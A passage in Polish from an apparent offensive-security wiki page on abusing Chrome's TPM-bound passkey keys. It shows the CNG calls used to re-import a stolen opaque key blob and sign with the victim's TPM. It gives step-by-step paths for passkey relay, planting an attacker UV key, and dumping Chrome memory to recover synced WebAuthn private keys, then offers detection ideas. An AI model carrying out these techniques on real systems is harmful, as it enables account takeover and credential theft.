Jeśli przeglądarka eksportuje klucz tożsamości powiązany z TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i przechowuje ten obiekt blob w stanie dostępnym dla użytkownika, malware **nie** musi wyodrębniać surowego klucza prywatnego. Może po prostu zaimportować obiekt blob ponownie na **tej samej maszynie** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Oznacza to, że **wiązanie ze sprzętem uniemożliwia eksport poza urządzenie, ale nie użycie przez tego samego użytkownika na przejętym punkcie końcowym**.

### Praktyczne ścieżki nadużyć

1. **Przekazanie passkey / przekazanie tożsamości urządzenia**<sup>[[4]](#references)</sup>
   - Wylicz `WebauthnCredentialSpecifics` z LevelDB przeglądarki Chrome.
   - Rozpocznij logowanie passkey i uzyskaj świeże wyzwanie WebAuthn.
   - Użyj skradzionego obiektu `wrapped_identity_private_key` na TPM ofiary, aby podpisać powiązanie żądania cloud-authenticator.
   - Przekaż zwrócone potwierdzenie do strony ufającej (relying party).
   - Jest to szczególnie przydatne, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca potwierdzeń z **`UV=0`**.
2. **Przejęcie oczekującego klucza UV**<sup>[[4]](#references)</sup>
   - Wymuś ponowne dołączenie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
   - Jeśli po dołączaniu urządzenie pozostanie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego publiczny klucz UV.
   - Jeśli dostawca nie weryfikuje atestacji / pochodzenia klucza UV z bezpiecznego sprzętu, późniejsze podpisy z klucza atakującego będą traktowane jako **`UV=1`**.
3. **Kradzież odzyskiwania klucza głównego / SDS**<sup>[[4]](#references)</sup>
   - Wymuś odzyskiwanie lub ponowne dołączenie, aby Chrome pobrał zsynchronizowany klucz główny passkey.
   - Obserwuj odtworzenie/modyfikację `passkey_enclave_state`, a następnie zrzuć pamięć Chrome, gdy tekst jawny **secretu domeny zabezpieczeń (SDS)** znajduje się w pamięci.
   - Użyj odzyskanego SDS, aby odszyfrować zaszyfrowane pola we wszystkich rekordach `WebauthnCredentialSpecifics` i odzyskać przenośne klucze prywatne WebAuthn.

### Pomysły dotyczące DFIR / wykrywania

- Monitoruj **usuwanie/ponowne tworzenie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generuj alerty o nietypowym dostępie procesów innych niż przeglądarka do Chrome **`Sync Data\LevelDB`**.
- Generuj alerty o **zrzutach pamięci Chrome** lub podejrzanym dostępie do pamięci między procesami.
- Sprawdzaj powtarzające się monity o **PIN odzyskiwania Google Password Manager** lub nieoczekiwane ponowne dołączanie.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatny w przypadku zsynchronizowanych passkey, ponieważ może pozostać niezmieniony, przez co klasyczne wykrywanie klonów jest mało skuteczne.

## References

- [1] [Unit 42 – Dochodzenie w sprawie wieloletnich, niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing z użyciem makra Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Przekazywanie passkey: nowa powierzchnia ataku w uwierzytelnianiu bez hasła](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / magazyn kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jak naprawdę działa magazyn danych Active Directory: wnętrze NTDS.dit (część 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Zdalne zrzucanie haseł z Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho rozszerza arsenał cyber-szpiegowski o toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcja CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – tryb kopii zapasowej Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegrama – kończenie aktywnych sesji](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
